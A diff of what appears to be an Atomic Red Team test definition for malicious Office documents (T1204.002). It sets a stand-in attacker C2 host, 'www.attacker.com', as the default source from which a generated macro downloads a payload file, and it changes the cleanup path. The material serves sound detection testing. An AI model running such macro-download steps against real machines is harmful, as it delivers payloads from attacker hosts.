@@ -340,20 +340,20 @@ atomic_tests:
       description: |
         This required variable points to a user defined HTTP server that will host the file_name in the c2_parent_directory.
       type: Url
-      default: null
+      default: www.attacker.com
     c2_parent_directory:
       description: |
         Parent directory where you have the "malicious" file on c2_domain server.
         Will default to root directory. Forward slashes are not needed at begining or ending of directory path
       type: Path
-      default: ""
+      default: "test"
     file_name:
       description: |
         "Malicious" file to be downloaded.
         This required file needs to be place on the user provided c2 domain
         Example file can be found at PathToAtomicsFolder/T1204.002/src/test9-example-payload.txt
       type: String
-      default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/test9-example-payload.txt
+      default: test9-example-payload.txt
     ms_product:
       description: |
         Maldoc application Word or Excel
@@ -388,7 +388,7 @@ atomic_tests:
       $macroCode = $macroCode -replace 'serverPath', $URL -replace 'fileName', "#{file_name}"
       Invoke-MalDoc -macroCode $macroCode -officeProduct "#{ms_product}"
     cleanup_command: |
-      Remove-Item "C:\Users\$env:username\Desktop\#{file_name}" -ErrorAction Ignore
+      Remove-Item "$env:systemroot\Temp\#{file_name}" -ErrorAction Ignore
 - name: LNK Payload Download
   auto_generated_guid: 581d7521-9c4b-420e-9695-2aec5241167f
   description: 
